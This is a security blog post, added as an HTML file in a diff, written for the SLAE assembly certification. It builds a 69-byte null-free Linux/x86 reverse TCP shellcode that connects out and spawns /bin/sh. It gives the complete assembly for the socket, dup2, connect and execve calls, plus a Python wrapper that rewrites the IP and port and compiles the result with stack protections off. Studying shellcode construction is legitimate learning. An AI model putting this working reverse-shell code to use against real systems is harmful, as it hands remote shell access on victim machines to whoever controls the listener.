@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="Nipun Jaswal">
+<meta name="description"
+    content="Modern Ninja :)    Hey Folks, Hope you guys are doing great. In the previous article, we saw how we can create a bind TCP shellcode, reduce its enormous length from 108 bytes to merely 80 bytes by making use of strategically placed instructions, register re-use, single byte instructions and much more. We also saw how we can create a wrapper in python which will help us modify the shellcode and make it usable for any port of choice." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/2018/01/art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode/" />
+
+
+<title>
+    
+    Art of Shellcoding:  Tale of the Smallest Reverse TCP Shellcode :: VAPT.IO - Home of the Next Gen Cyber Ninja  — Learn Vulnerability Assessment and Penetration Testing
+    
+</title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.7bfbbe12786fa0ded4b4c0d792cbb36a5bd0bdb0b856dde57aa7b1f6fe0f2b87.css">
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
+<link rel="shortcut icon" href="/favicon.ico">
+<meta name="theme-color" content="#252627"><meta itemprop="name" content="Art of Shellcoding:  Tale of the Smallest Reverse TCP Shellcode">
+<meta itemprop="description" content="Modern Ninja :)    Hey Folks, Hope you guys are doing great. In the previous article, we saw how we can create a bind TCP shellcode, reduce its enormous length from 108 bytes to merely 80 bytes by making use of strategically placed instructions, register re-use, single byte instructions and much more. We also saw how we can create a wrapper in python which will help us modify the shellcode and make it usable for any port of choice.">
+
+
+<meta itemprop="datePublished" content="2018-01-05T20:25:00&#43;05:30" />
+<meta itemprop="dateModified" content="2018-01-05T20:25:00&#43;05:30" />
+<meta itemprop="wordCount" content="1166">
+
+
+
+<meta itemprop="keywords" content="slae,slae assignment 2," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/"/>
+
+<meta name="twitter:title" content="Art of Shellcoding:  Tale of the Smallest Reverse TCP Shellcode"/>
+<meta name="twitter:description" content="Modern Ninja :)    Hey Folks, Hope you guys are doing great. In the previous article, we saw how we can create a bind TCP shellcode, reduce its enormous length from 108 bytes to merely 80 bytes by making use of strategically placed instructions, register re-use, single byte instructions and much more. We also saw how we can create a wrapper in python which will help us modify the shellcode and make it usable for any port of choice."/>
+
+
+
+
+<meta property="article:published_time" content="2018-01-05 20:25:00.001 &#43;0530 IST" />
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">ap3x@vapt.io:~# ./hack</span>
+            <span class="logo__cursor"></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>6 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title"><a href="/posts/2018/01/art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode/">Art of Shellcoding:  Tale of the Smallest Reverse TCP Shellcode</a></h1>
+
+            
+
+            <div class="post-content">
+                <table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-eyechangedlogogreen.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-eyechangedlogogreen.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Modern Ninja :)</td>
+</tr>
+</tbody>
+</table>
+
+<p>Hey Folks, Hope you guys are doing great. In the previous article, we
+saw how we can create a bind TCP shellcode, reduce its enormous length
+from <strong>108</strong> bytes to merely <strong>80</strong> bytes by making use of strategically
+placed instructions, register re-use, single byte instructions and much
+more. We also saw how we can create a wrapper in python which will help
+us modify the shellcode and make it usable for any port of choice.
+In this article, we will discuss how we can create a reverse TCP
+shellcode. In case you missed my previous post, <a href="http://www.nipunjaswal.com/2018/01/the-saga-of-bind-tcp.html" target="_blank">click
+here</a> to
+read it first since this post builds heavily on the mechanisms discussed
+in the last post.</p>
+
+<p>Our Agenda for this exercise is to:</p>
+
+<ul>
+<li>Build a Null Free TCP reverse shellcode</li>
+<li>Write a wrapper that can update IP address and port in the shellcode</li>
+<li>Write an efficient and small shellcode</li>
+</ul>
+
+<p><span style="font-family: inherit;"><span
+style="font-size: x-small;"><span style="color: orange;"><strong>Note: On this
+day (Friday, Jan 5, 2018, 1:28 AM IST) The shellcode we created in this
+post is the smallest Null -Free and Register Pollution Free /bin/sh
+shellcode (checked on exploit-db.com), Not counting ( Register Pollution
+based Shellcodes, Netcat Reverse Shells)</strong></span></span></span>
+<span style="font-family: inherit;"><span
+style="font-size: x-small;"><span style="color: orange;"><strong>Update: The
+Shellcode has been accepted by Exploit-DB and can be found
+at </strong></span></span></span><span
+style="color: red; font-size: x-small;"><strong><a href="https://www.exploit-db.com/exploits/43433/" target="_blank">https://www.exploit-db.com/exploits/43433/</a></strong></span></p>
+
+<blockquote>
+<p>[shellcode] Linux/x86 - Reverse TCP Shell (127.1.1.1:8888/TCP)
+Shellcode (69 bytes) <a href="https://t.co/a8OWh1glPG" target="_blank">https://t.co/a8OWh1glPG</a></p>
+
+<p>— Exploit Database (@ExploitDB) <a href="https://twitter.com/ExploitDB/status/949231418843971585?ref_src=twsrc%5Etfw" target="_blank">January 5,
+2018</a></p>
+</blockquote>
+
+<p>So, let&rsquo;s quickly generate a linux/x86/shell_reverse_tcp using
+msfvenom and feed it to libemu as shown on the following screen:</p>
+
+<table>
+<colgroup>
+<col style="width: 50%" />
+<col style="width: 50%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-02%2B16.00.25.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-02%2B16.00.25.png" /></a></td>
+<td></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Libemu Analysis of the Reverse Shell TCP</td>
+<td><br />
+</td>
+</tr>
+</tbody>
+</table>
+
+<p>We can see that we have primarily four system calls that will come handy
+for creating shellcode for reverse TCP which are: <strong>socket, dup2,
+connect</strong> and <strong>execve</strong>. The main change in this shellcode is that
+instead of having system calls like <strong>bind, accept and listen</strong>, we have
+connect system call only. This makes our work reasonably comfortable as
+the only change required is to place the connect system call instead of
+all the three discussed above. So let&rsquo;s get started. However, we will
+try to write a much more efficient and space friendly code this time.
+The first call is SYS_SOCKET, let&rsquo;s set it up as shown on the following
+screen:</p>
+
+<blockquote>
+<p>xor ebx,ebx ; Clearing out EBX
+push ebx     ; Pushing 0 onto the stack i.e. Value of EBX &mdash;&gt;
+IP_PROTO
+inc ebx        ; Increment EBX to 1  &mdash;&gt; SYS_SOCKET
+push ebx     ; Push 1 onto the stack &mdash;&gt; SOCK_STREAM
+push 0x2     ; Push 2 onto the stack &mdash;&gt; AF_INET (domain:
+Internet)
+mov ecx, esp ; Move the pointer to ECX, which will point to {2,1,0}
+push 0x66   ; SOCKETCALL
+pop eax       ;  SOCKETCALL &ndash;&gt; EAX
+int 0x80      ; Interrupt ( EAX=&gt; 0x66 EBX=0x1 ECX =&gt; {2,1,0}</p>
+</blockquote>
+
+<p>Similar to the bind shell, we setup SYS_SOCKET as shown above. We can
+see we have DUP2 as the next system call which is being called thrice.
+Hence, let&rsquo;s set it up as follow:</p>
+
+<blockquote>
+<p>xchg ebx,eax ; The resultant sockfd value from the previous call is
+moved to EBX
+pop ecx       ; Top of the stack contains 2 pushed in the previous
+call, we load it to ECX
+loop:           ; Loop Begins
+    mov al,0x3f ; Moving DUP2 call to EAX
+    int 0x80  ; Interrupt
+    dec ecx   ; Decreasing ECX
+    jns loop  ; Loop until SF Not Set</p>
+</blockquote>
+
+<p>The above set of instructions will loop until the value of ECX becomes
+zero and SF Flag is set.  Next, We have the core system call of this
+shellcode which will connect to the listeners IP address on the
+specified port. Let&rsquo;s set up the connect system call as follows:</p>
+
+<blockquote>
+<p> 
+push 0x101017f      ; IP Address 127.1.1.1
+push word 0xb822  ; Port 8888  (DWORD would have caused a NULL Byte)
+push word 2            ; AF_INET  (Null Byte in AF_INET: 0002)
+mov ecx,esp            ; Pointer 1 to {b8220002,0101017f)        
+mov al,0x66            ; SOCKETCALL
+push eax                  ; We push 66 as length (Clearing EAX not
+required)
+push ecx                  ; Pointer 1 Pushed onto the stack
+push ebx                  ; Sockfd pushed onto the stack
+mov bl,0x3              ; EBX now contains SYS_CONNECT
+mov ecx,esp            ; Pointer 2 &ndash;&gt; {sockfd, Pointer 1, 66}
+int 0x80                  ; Interrupt Generated</p>
+</blockquote>
+
+<p>There are two main highlights here; We did not move 0xb8220002 as a
+DWORD this may have decreased the length of the shellcode, but it would
+have introduced a Null byte as well(<strong>00</strong>02). Hence, we pushed port in
+two halves. Additionally, we did not use IP as 127.0.0.1 because it
+would have contained nulls as well. Interestingly, we did not load 16 as
+the length this time and pushed the value of the call itself as length.
+This also means that it has a negligible effect on the system call.
+Hence, we saved bytes required to clear it out and loading the value 16
+in there as we did in the previous post. Finally, we have the last
+segment of code as follows:</p>
+
+<blockquote>
+<p> 
+push edx ; Pushing 0 Value to the stack
+push 0x68732f2f ; /bin
+push 0x6e69622f; //sh
+mov ebx,esp ; pointer 1 {/bin//sh}
+push edx ; Pushing 0 Value to the stack
+push ebx ; Pointer 1 to the stack
+mov ecx,esp ; pointer 2 {Pointer 1, 0}
+mov al,0xb ; EXECVE System Call
+int 0x80 ; Interrupt</p>
+</blockquote>
+
+<p>The code above is nothing but setting up EXECVE like we did in the last
+post. Compiling the code we have:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.17.34.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.17.34.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Generating Shellcode</td>
+</tr>
+</tbody>
+</table>
+
+<p> Compiling the shellcode in a C program and testing it, we can see that
+our shellcode works correctly as shown below:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.20.20.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.20.20.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Compiling and running shellcode.c program with our shellcode</td>
+</tr>
+</tbody>
+</table>
+
+<p>Let&rsquo;s write a python wrapper for the shellcode so that changing IP
+address and PORT on the fly won&rsquo;t be a hassle for us:</p>
+
+<blockquote>
+<p> </p>
+
+<pre><code>#!/usr/bin/python
+import sys
+import socket
+print &quot;Stub File:&quot;+sys.argv[1]
+print &quot;IP Addr:&quot;+sys.argv[2]
+print &quot;Port Used:&quot;+ sys.argv[3]
+ip_addr= sys.argv[2].split(&quot;.&quot;)
+ip_addr_bytes = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip_addr))
+
+with open(sys.argv[1]+&quot;.c&quot;, &quot;rb&quot;) as f:
+    contents = f.readlines()
+
+def H( hexStr ):
+    bytes = []
+    hexStr = ''.join( hexStr.split(&quot; &quot;) )
+    for i in range(0, len(hexStr), 2):
+        bytes.append( chr( int (hexStr[i:i+2], 16 ) ) )
+    return ''.join( bytes )
+
+ip_addr_final= repr(H(ip_addr_bytes)).replace(&quot;'&quot;,&quot;&quot;)
+
+port = hex(int(sys.argv[3])).split('x')[1]
+fh, sh = port[:2],port[2:]
+if len(fh) == 1: fh = &quot;0&quot; + fh
+if len(sh) == 1: sh = &quot;0&quot; + sh
+_p = &quot;\\x{0}\\x{1}&quot;.format(fh,sh)
+for j,i in enumerate(contents):
+    if &quot;\\x22\\xb8&quot; in i:
+        print &quot;Line Number :&quot; + str(j)
+ contents[j] = '&quot;' + _p +'&quot;'
+    elif &quot;\\x7f\\x01\\x01\\x01&quot; in i:
+ print &quot;Line Number :&quot; + str(j)
+ contents[j] = '&quot;' +ip_addr_final + '&quot;'
+nf = sys.argv[1]+&quot;_new.c&quot;
+with open(nf, &quot;wb&quot;) as f:
+    f.writelines(contents)
+import os
+os.system(&quot;gcc {0} -o {1} -fno-stack-protector -z execstack&quot;.format(nf,sys.argv[1]))
+os.system(&quot;rm {0}&quot;.format(nf))
+</code></pre>
+
+<p> </p>
+</blockquote>
+
+<p>Running the python code, we can see that we can now change IP and port
+parameters on the fly:</p>
+
+<table>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;"><a href="../images/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.46.49.png"><img src="../images/thumbnails/2018-01-05-art-of-shellcoding-tale-of-the-smallest-reverse-tcp-shellcode-Screenshot%2B2018-01-05%2B01.46.49.png" /></a></td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">Wrapper &amp; Execution</td>
+</tr>
+</tbody>
+</table>
+
+<p>We have completed all the required tasks. We now have one of the
+smallest reverse TCP shellcode with an on the fly IP and Port changing
+wrapper.</p>
+
+<p>Files for this tutorial can be found at:
+<a href="https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-2" target="_blank">https://github.com/nipunjaswal/slae-exam/tree/master/ASSGN-2</a></p>
+
+<p><span style="color: red;">This blog post has been created for completing
+the requirements of the SecurityTube Linux Assembly Expert
+certification:</span>
+<span style="color: red;"> </span><span
+style="color: red;"><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></span>
+<span style="color: red;"> </span><span style="color: red;">Student-ID:
+SLAE-1080</span></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/slae">slae</a></span><span class="tag"><a href="/tags/slae-assignment-2">slae assignment 2</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1166 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2018-01-05 20:25 &#43;0530</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="/posts/2018/01/art-of-shellcoding-cracking-eggs-with-egghunters/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">Art of Shellcoding: Cracking Eggs with EggHunters</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="/posts/2018/01/art-of-shellcoding-the-saga-of-bind-tcp-shell/">
+                                <span class="button__text">Art of Shellcoding: The Saga of Bind TCP Shell</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2019</span>
+            
+                <span><a href="/">Apex Predator</a></span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>
+
+
+
+    </body>
+</html>
